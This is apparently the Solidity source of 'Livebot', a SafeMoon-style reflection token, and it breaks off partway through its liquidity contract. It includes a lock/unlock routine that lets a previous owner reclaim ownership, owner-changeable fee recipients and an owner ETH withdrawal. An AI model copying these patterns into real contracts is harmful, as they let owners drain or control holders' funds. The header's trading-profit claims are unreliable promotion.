/*

"SPDX-License-Identifier: MIT"

The MIT License (MIT)

Copyright (c) 2021 skyxcripto.
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation 
files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, 
modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software
is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES 
OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE 
LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR 
IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
For more information regarding the MIT License visit: https://opensource.org/licenses/MIT

@AUTHOR Skyxcripto. https://skyxcripto.com/
*

================================================================
##       #### ##     ## ######## ########   #######  ######## 
##        ##  ##     ## ##       ##     ## ##     ##    ##    
##        ##  ##     ## ##       ##     ## ##     ##    ##    
##        ##  ##     ## ######   ########  ##     ##    ##    
##        ##   ##   ##  ##       ##     ## ##     ##    ##    
##        ##    ## ##   ##       ##     ## ##     ##    ##    
######## ####    ###    ######## ########   #######     ##    
================================================================

Deflationary ERC20 token that reflects gains realized on trading bots.

* The protocol that allows you to collect tokens and make trades in an external application and return profits 
to all holders.

* Each transaction collects some fees that are transferred to an address that contains all tokens to make trades:

* The Process consists of 3 steps:

1) collects tradingBot fee.

2) Convert the token to a stable asset like BNB/ETH/Cake

3) Carry out Trades 24 hours on external platforms such as Underbit (https://trading.wunderbit.co/pt)

4) With the Profits acquired in tradding bots, the Livebot token is repurchased.
with the total amount for the month or week and redistributed to all holders.

www.github.com/skyxcripto/livebot

*/

pragma solidity ^0.8.4;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
   
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {return msg.sender;}
    function _msgData() internal view virtual returns (bytes calldata) {this; return msg.data;}
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
    function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b <= a, errorMessage); return a - b; }
    }
}

library Address {
    function isContract(address account) internal view returns (bool) { uint256 size; assembly { size := extcodesize(account) } return size > 0;}
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");(bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {return functionCall(target, data, "Address: low-level call failed");}
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {return functionCallWithValue(target, data, 0, errorMessage);}
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {return functionCallWithValue(target, data, value, "Address: low-level call with value failed");}
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) { return returndata; } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {revert(errorMessage);}
        }
    }
}

library SafeERC20 {
    using Address for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    /**
     * @dev Deprecated. This function has issues similar to the ones found in
     * {IERC20-approve}, and its usage is discouraged.
     *
     * Whenever possible, use {safeIncreaseAllowance} and
     * {safeDecreaseAllowance} instead.
     */
    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        // safeApprove should only be called when setting an initial allowance,
        // or when resetting it to zero. To increase and decrease it, use
        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }

    /**
     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
     * on the return value: the return value is optional (but if data is returned, it must not be false).
     * @param token The token targeted by the call.
     * @param data The call data (encoded using abi.encode or one of its variants).
     */
    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which verifies that
        // the target address contains contract code and also asserts for success in the low-level call.

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            // Return data is optional
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

abstract contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    function getUnlockTime() public view returns (uint256) {
        return _lockTime;
    }
    function lock(uint256 time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _lockTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }
    function unlock() public virtual {
        require(_previousOwner == msg.sender, "Only the previous owner can unlock onwership");
        require(block.timestamp > _lockTime , "The contract is still locked");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}

abstract contract Manageable is Context {
    address private _manager;
    event ManagementTransferred(address indexed previousManager, address indexed newManager);
    constructor(){
        address msgSender = _msgSender();
        _manager = msgSender;
        emit ManagementTransferred(address(0), msgSender);
    }
    function manager() public view returns(address){ return _manager; }
    modifier onlyManager(){
        require(_manager == _msgSender(), "Manageable: caller is not the manager");
        _;
    }
    function transferManagement(address newManager) external virtual onlyManager {
        emit ManagementTransferred(_manager, newManager);
        _manager = newManager;
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

abstract contract Tokenomics   {
   
    using SafeMath for uint256;
   
    // --------------------- Token Settings ------------------- //
    event MarketingSet (address indexed marketingAddress);
   
    string internal constant NAME = "Livebot";
    string internal constant SYMBOL = "Lbot";
   
    uint16 internal constant FEES_DIVISOR = 10**3;
    uint8 internal constant DECIMALS = 9;
    uint256 internal constant ZEROES = 10**DECIMALS;
   
    uint256 private constant MAX = ~uint256(0);
    uint256 internal constant TOTAL_SUPPLY = 1000000000000000 * ZEROES;
    uint256 internal _reflectedSupply = (MAX - (MAX % TOTAL_SUPPLY));

    uint256 internal constant maxTransactionAmount =  10000000000000*ZEROES;

    uint256 internal constant maxWalletBalance = TOTAL_SUPPLY / 50; // 2% of the total supply
   
   
    uint256 internal constant numberOfTokensToSwapToLiquidity = TOTAL_SUPPLY / 50;

    address internal devAddress = 0xCA2a13C53b9fb3103308Abc67e5BBF71F7f433Dc;
    address internal marketingAddress = 0xd7d5aFF5C8C93C2dE13372a30D040857142bfB80;
    address internal traddingBot = 0x5113ee31089609595f6c028eF7241F837676683d;
    address internal burnAddress = 0x000000000000000000000000000000000000dEaD;
 
    enum LiveFeeType { Antiwhale, Burn, Liquidity, Rfi, External, ExternalToETH }
    struct FeeLiveBot {
        LiveFeeType name;
        uint256 value;
        address recipient;
        uint256 total;
    }

    FeeLiveBot[] internal fees;
    uint256 internal sumOfFeeLbot;

    constructor() {
        _addFeeLiveBotContract();
    }

    function _addFeeLiveBotContract(LiveFeeType name, uint256 value, address recipient) private {
        fees.push( FeeLiveBot(name, value, recipient, 0 ) );
        sumOfFeeLbot += value;
       
    }
   
    function _addFeeLiveBotContract() private {
        _addFeeLiveBotContract(LiveFeeType.Burn, 10, burnAddress );
        _addFeeLiveBotContract(LiveFeeType.Liquidity, 40, address(this) );
        _addFeeLiveBotContract(LiveFeeType.External, 30, traddingBot);
        _addFeeLiveBotContract(LiveFeeType.External, 20, marketingAddress);
        _addFeeLiveBotContract(LiveFeeType.External, 20, devAddress);
    }
   
    function _updateFeeLiveBotRecipient(uint256 index, address recipient) internal {
        FeeLiveBot storage fee = _getFeeLiveBotStruct(index);
        fee.recipient = recipient;
    }
   
    function _getFeeLiveBotsCount() internal view returns (uint256){ return fees.length; }

    function _getFeeLiveBotStruct(uint256 index) private view returns(FeeLiveBot storage){
        require( index >= 0 && index < fees.length, "FeeLiveBotsSettings._getFeeLiveBotStruct: FeeLiveBot index out of bounds");
        return fees[index];
    }
   
    function _getFeeLiveBot(uint256 index) internal view returns (LiveFeeType, uint256, address, uint256){
        FeeLiveBot memory fee = _getFeeLiveBotStruct(index);
        return ( fee.name, fee.value, fee.recipient, fee.total );
    }
   
    //@Devs this FeeLiveBots Address Updates
    function _setMktAdress (address _setMAddress ) virtual internal {
        //Update index from _addFeeLiveBotContract
       _updateFeeLiveBotRecipient(3,_setMAddress);
       marketingAddress = _setMAddress;
    }
   
    function _setDevAddress (address _setDAddress ) virtual internal {
       //Update index from _addFeeLiveBotContract
       _updateFeeLiveBotRecipient(4,_setDAddress);
       devAddress = _setDAddress;
    }
   
    function _setBotAddress (address _setBAddress ) virtual internal {
        //Update index from _addFeeLiveBotContract
       _updateFeeLiveBotRecipient(2,_setBAddress);
       traddingBot = _setBAddress;
    }
   
 
    function _addFeeLiveBotContractCollectedAmount(uint256 index, uint256 amount) internal {
        FeeLiveBot storage fee = _getFeeLiveBotStruct(index);
        fee.total = fee.total.add(amount);
    }

    // function getCollectedFeeLiveBotTotal(uint256 index) external view returns (uint256){
    function getCollectedFeeLiveBotTotal(uint256 index) internal view returns (uint256){
        FeeLiveBot memory fee = _getFeeLiveBotStruct(index);
        return fee.total;
    }
   
    function _setFeeLiveBotAmount(uint256 index, uint256 amount) internal {
        FeeLiveBot storage fee = _getFeeLiveBotStruct(index);
        sumOfFeeLbot = sumOfFeeLbot - fee.value + amount; // update the total fees sum
        fee.value = amount;
    }
   
   
   
}

abstract contract Presaleable is Manageable {
    bool internal isInPresale;
    function setPreseableEnabled(bool value) external onlyManager {
        isInPresale = value;
    }
}

abstract contract BaseRfiToken is IERC20, IERC20Metadata, Ownable, Presaleable, Tokenomics {

    using SafeMath for uint256;
    using Address for address;
   
    mapping (address => uint256) internal _reflectedBalances;
    mapping (address => uint256) internal _balances;
    mapping (address => mapping (address => uint256)) internal _allowances;
   
    mapping (address => bool) internal _isExcludedFromFeeLiveBot;
    mapping (address => bool) internal _isExcludedFromRewards;
    address[] private _excluded;
   
    constructor(){
       
        _reflectedBalances[owner()] = _reflectedSupply;
       
        // exclude owner and this contract from fee
        _isExcludedFromFeeLiveBot[owner()] = true;
        _isExcludedFromFeeLiveBot[address(this)] = true;
       
        // exclude the owner and this contract from rewards
        _exclude(owner());
        _exclude(address(this));

        emit Transfer(address(0), owner(), TOTAL_SUPPLY);
       
    }
   
    /** Functions required by IERC20Metadat **/
    function name() external pure override returns (string memory) { return NAME; }
   
    function symbol() external pure override returns (string memory) { return SYMBOL; }
   
    function decimals() external pure override returns (uint8) { return DECIMALS; }
     
    /** Functions required by IERC20Metadat - END **/
    /** Functions required by IERC20 **/
    function totalSupply() external pure override returns (uint256) {
            return TOTAL_SUPPLY;
          }
       
    function balanceOf(address account) public view override returns (uint256){
            if (_isExcludedFromRewards[account]) return _balances[account];
            return tokenFromReflection(_reflectedBalances[account]);
        }
       
    function TraddingBotAddress() public view  returns (address){
            return traddingBot;
        }
       
    function MarketingAddress() public view  returns (address){
            return marketingAddress;
        }
       
    function DevAddress() public view  returns (address){
            return devAddress;
    }
       
    function transfer(address recipient, uint256 amount) external override returns (bool){
            _transfer(_msgSender(), recipient, amount);
            return true;
        }
   
    function allowance(address owner, address spender) external view override returns (uint256){
            return _allowances[owner][spender];
        }
   
    function approve(address spender, uint256 amount) external override returns (bool) {
            _approve(_msgSender(), spender, amount);
            return true;
        }
       
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool){
            _transfer(sender, recipient, amount);
            _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }
       
    function collectFeeLiveBot(uint256 index, uint256 tAmount) internal  virtual;
         
 
    function ReflectTokens(uint256 tAmount) public  onlyManager() {
            uint256 index = 2;
            //Dev, this function reflects tokens from the traddingbot wallet that is stored in deliveryAddress
            address sender = traddingBot;
            require(!_isExcludedFromRewards[sender], "Excluded addresses cannot call this function");
            (uint256 rAmount,,,,) = _getValues(tAmount,0);
             _reflectedBalances[sender] = _reflectedBalances[sender].sub(rAmount);
             _reflectedSupply = _reflectedSupply.sub(rAmount);
             _addFeeLiveBotContractCollectedAmount(index, tAmount);
             
        }
       
    //Sets Address
    function setMarketingAddress(address MktAddress ) external onlyOwner {
            _setMktAdress(MktAddress);
        }
       
    function setDevAddress(address _DevAddress ) external onlyOwner {
            _setDevAddress(_DevAddress);
    }
       
    function setBotAddress(address BotAddress ) external onlyOwner {
            _setBotAddress(BotAddress);
        }
        //Function to remove bnb from the contract if someone sends it accidentally or I need to remove it.
    function WithdrawETH(address payable to) public onlyOwner {
         require(address(this).balance > 0,"07");
         to.transfer(address(this).balance);
        }
    /** Functions required by IERC20 - END **/

    function burn(uint256 amount) external {
   
            address sender = _msgSender();
            require(sender != address(0), "BaseRfiToken: burn from the zero address");
            require(sender != address(burnAddress), "BaseRfiToken: burn from the burn address");
   
            uint256 balance = balanceOf(sender);
            require(balance >= amount, "BaseRfiToken: burn amount exceeds balance");
   
            uint256 reflectedAmount = amount.mul(_getCurrentRate());
   
            // remove the amount from the sender's balance first
            _reflectedBalances[sender] = _reflectedBalances[sender].sub(reflectedAmount);
            if (_isExcludedFromRewards[sender])
                _balances[sender] = _balances[sender].sub(amount);
   
            _burnTokens( sender, amount, reflectedAmount );
        }
   
    /**
     * @dev "Soft" burns the specified amount of tokens by sending them
     * to the burn address
     */
    function _burnTokens(address sender, uint256 tBurn, uint256 rBurn) internal {

        /**
         * @dev Do not reduce _totalSupply and/or _reflectedSupply. (soft) burning by sending
         * tokens to the burn address (which should be excluded from rewards) is sufficient
         * in RFI
         */
        _reflectedBalances[burnAddress] = _reflectedBalances[burnAddress].add(rBurn);
        if (_isExcludedFromRewards[burnAddress])
            _balances[burnAddress] = _balances[burnAddress].add(tBurn);

        /**
         * @dev Emit the event so that the burn address balance is updated (on bscscan)
         */
        emit Transfer(sender, burnAddress, tBurn);
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
   
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
   
    function isExcludedFromReward(address account) external view returns (bool) {
        return _isExcludedFromRewards[account];
    }

    /**
     * @dev Calculates and returns the reflected amount for the given amount with or without
     * the transfer fees (deductTransferFeeLiveBot true/false)
     */
    function reflectionFromToken(uint256 tAmount, bool deductTransferFeeLiveBot) external view returns(uint256) {
        require(tAmount <= TOTAL_SUPPLY, "Amount must be less than supply");
        if (!deductTransferFeeLiveBot) {
            (uint256 rAmount,,,,) = _getValues(tAmount,0);
            return rAmount;
        } else {
            (,uint256 rTransferAmount,,,) = _getValues(tAmount,_getSumOfFeeLiveBots(_msgSender(), tAmount));
            return rTransferAmount;
        }
    }

    /**
     * @dev Calculates and returns the amount of tokens corresponding to the given reflected amount.
     */
    function tokenFromReflection(uint256 rAmount) internal view returns(uint256) {
        require(rAmount <= _reflectedSupply, "Amount must be less than total reflections");
        uint256 currentRate = _getCurrentRate();
        return rAmount.div(currentRate);
    }
   
    function excludeFromReward(address account) external onlyOwner() {
        require(!_isExcludedFromRewards[account], "Account is not included");
        _exclude(account);
    }
   
    function _exclude(address account) internal {
        if(_reflectedBalances[account] > 0) {
            _balances[account] = tokenFromReflection(_reflectedBalances[account]);
        }
        _isExcludedFromRewards[account] = true;
        _excluded.push(account);
    }

    function includeInReward(address account) external onlyOwner() {
        require(_isExcludedFromRewards[account], "Account is not excluded");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _balances[account] = 0;
                _isExcludedFromRewards[account] = false;
                _excluded.pop();
                break;
            }
        }
    }
   
    function setExcludedFromFeeLiveBot(address account, bool value) external onlyOwner {
        _isExcludedFromFeeLiveBot[account] = value;
       
    }
   
    function isExcludedFromFeeLiveBot(address account) public view returns(bool) { return _isExcludedFromFeeLiveBot[account]; }
   
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "BaseRfiToken: approve from the zero address");
        require(spender != address(0), "BaseRfiToken: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
   
    /**
     */
    function _isUnlimitedSender(address account) internal view returns(bool){
        // the owner should be the only whitelisted sender
        return (account == owner());
    }
    /**
     */
    function _isUnlimitedRecipient(address account) internal view returns(bool){
        // the owner should be a white-listed recipient
        // and anyone should be able to burn as many tokens as
        // he/she wants
        return (account == owner() || account == burnAddress);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "BaseRfiToken: transfer from the zero address");
        require(recipient != address(0), "BaseRfiToken: transfer to the zero address");
        require(sender != address(burnAddress), "BaseRfiToken: transfer from the burn address");
        require(amount > 0, "Transfer amount must be greater than zero");
       
        // indicates whether or not feee should be deducted from the transfer
        bool takeFeeLiveBot = true;

        if ( isInPresale ){ takeFeeLiveBot = false; }
        else {
            /**
            * Check the amount is within the max allowed limit as long as a
            * unlimited sender/recepient is not involved in the transaction
            */
            if ( amount > maxTransactionAmount && !_isUnlimitedSender(sender) && !_isUnlimitedRecipient(recipient) ){
                revert("Transfer amount exceeds the maxTxAmount.");
            }
            /**
            * The pair needs to excluded from the max wallet balance check;
            * selling tokens is sending them back to the pair (without this
            * check, selling tokens would not work if the pair's balance
            * was over the allowed max)
            *
            * Note: This does NOT take into account the fees which will be deducted
            *       from the amount. As such it could be a bit confusing
            */
            if ( maxWalletBalance > 0 && !_isUnlimitedSender(sender) && !_isUnlimitedRecipient(recipient) && !_isV2Pair(recipient) ){
                uint256 recipientBalance = balanceOf(recipient);
                require(recipientBalance + amount <= maxWalletBalance, "New balance would exceed the maxWalletBalance");
            }
        }

        // if any account belongs to _isExcludedFromFeeLiveBot account then remove the fee
        if(_isExcludedFromFeeLiveBot[sender] || _isExcludedFromFeeLiveBot[recipient]){ takeFeeLiveBot = false; }

        _beforeTokenTransfer(sender, recipient, amount, takeFeeLiveBot);
        _transferTokens(sender, recipient, amount, takeFeeLiveBot);
       
    }

    function _transferTokens(address sender, address recipient, uint256 amount, bool takeFeeLiveBot) private {
   
        /**
         * We don't need to know anything about the individual fees here
         * (like Safemoon does with `_getValues`). All that is required
         * for the transfer is the sum of all fees to calculate the % of the total
         * transaction amount which should be transferred to the recipient.
         *
         * The `_takeFeeLiveBots` call will/should take care of the individual fees
         */
        uint256 sumOfFeeLbot = _getSumOfFeeLiveBots(sender, amount);
        if ( !takeFeeLiveBot ){ sumOfFeeLbot = 0; }
       
        (uint256 rAmount, uint256 rTransferAmount, uint256 tAmount, uint256 tTransferAmount, uint256 currentRate ) = _getValues(amount, sumOfFeeLbot);
       
        /**
         * Sender's and Recipient's reflected balances must be always updated regardless of
         * whether they are excluded from rewards or not.
         */
        _reflectedBalances[sender] = _reflectedBalances[sender].sub(rAmount);
        _reflectedBalances[recipient] = _reflectedBalances[recipient].add(rTransferAmount);

        /**
         * Update the true/nominal balances for excluded accounts
         */        
        if (_isExcludedFromRewards[sender]){ _balances[sender] = _balances[sender].sub(tAmount); }
        if (_isExcludedFromRewards[recipient] ){ _balances[recipient] = _balances[recipient].add(tTransferAmount); }
       
        _takeFeeLiveBots( amount, currentRate, sumOfFeeLbot );
        emit Transfer(sender, recipient, tTransferAmount);
    }
   
    function _takeFeeLiveBots(uint256 amount, uint256 currentRate, uint256 sumOfFeeLbot ) private {
        if ( sumOfFeeLbot > 0 && !isInPresale ){
            _takeTransactionFeeLiveBots(amount, currentRate);
        }
    }
   
    function _getValues(uint256 tAmount, uint256 feesSum) internal view returns (uint256, uint256, uint256, uint256, uint256) {
       
        uint256 tTotalFeeLiveBots = tAmount.mul(feesSum).div(FEES_DIVISOR);
        uint256 tTransferAmount = tAmount.sub(tTotalFeeLiveBots);
        uint256 currentRate = _getCurrentRate();
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rTotalFeeLiveBots = tTotalFeeLiveBots.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rTotalFeeLiveBots);
       
        return (rAmount, rTransferAmount, tAmount, tTransferAmount, currentRate);
    }
   
    function _getCurrentRate() internal view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }
   
    function _getCurrentSupply() internal view returns(uint256, uint256) {
        uint256 rSupply = _reflectedSupply;
        uint256 tSupply = TOTAL_SUPPLY;  

        /**
         * The code below removes balances of addresses excluded from rewards from
         * rSupply and tSupply, which effectively increases the % of transaction fees
         * delivered to non-excluded holders
         */    
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_reflectedBalances[_excluded[i]] > rSupply || _balances[_excluded[i]] > tSupply) return (_reflectedSupply, TOTAL_SUPPLY);
            rSupply = rSupply.sub(_reflectedBalances[_excluded[i]]);
            tSupply = tSupply.sub(_balances[_excluded[i]]);
        }
        if (tSupply == 0 || rSupply < _reflectedSupply.div(TOTAL_SUPPLY)) return (_reflectedSupply, TOTAL_SUPPLY);
        return (rSupply, tSupply);
    }
   
    /**
     * @dev Hook that is called before any transfer of tokens.
     */
    function _beforeTokenTransfer(address sender, address recipient, uint256 amount, bool takeFeeLiveBot) internal virtual;
   

    function _getSumOfFeeLiveBots(address sender, uint256 amount) internal view virtual returns (uint256);

    /**
     * @dev A delegate which should return true if the given address is the V2 Pair and false otherwise
     */
    function _isV2Pair(address account) internal view virtual returns(bool);

 
    function _redistribute(uint256 amount, uint256 currentRate, uint256 fee, uint256 index) internal {
        uint256 tFeeLiveBot = amount.mul(fee).div(FEES_DIVISOR);
        uint256 rFeeLiveBot = tFeeLiveBot.mul(currentRate);

        _reflectedSupply = _reflectedSupply.sub(rFeeLiveBot);
        _addFeeLiveBotContractCollectedAmount(index, tFeeLiveBot);
    }

    /**
     * @dev Hook that is called before the `Transfer` event is emitted if fees are enabled for the transfer
     */
    function _takeTransactionFeeLiveBots(uint256 amount, uint256 currentRate) internal virtual;
}

abstract contract Liquifier is Ownable, Manageable {

    using SafeMath for uint256;

    uint256 private withdrawableBalance;

    enum Env {Testnet, MainnetV1, MainnetV2}
    Env private _env;

    // UniswapSwap V1
    address private _mainnetRouterV1Address = 0x09cabEC1eAd1c0Ba254B09efb3EE13841712bE14;
    // UniswapSwap V2
    address private _mainnetRouterV2Address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    // Testnet
    // address private _testnetRouterAddress = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;
    // UniswapSwap Testnet = https://pancake.kiemtienonline360.com/
    address private _testnetRouterAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    IUniswapV2Router01 internal _router;
    address internal _pair;
   
    bool private inSwapAndLiquify;
    bool private swapAndLiquifyEnabled = true;

    uint256 private maxTransactionAmount;
    uint256 private numberOfTokensToSwapToLiquidity;

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

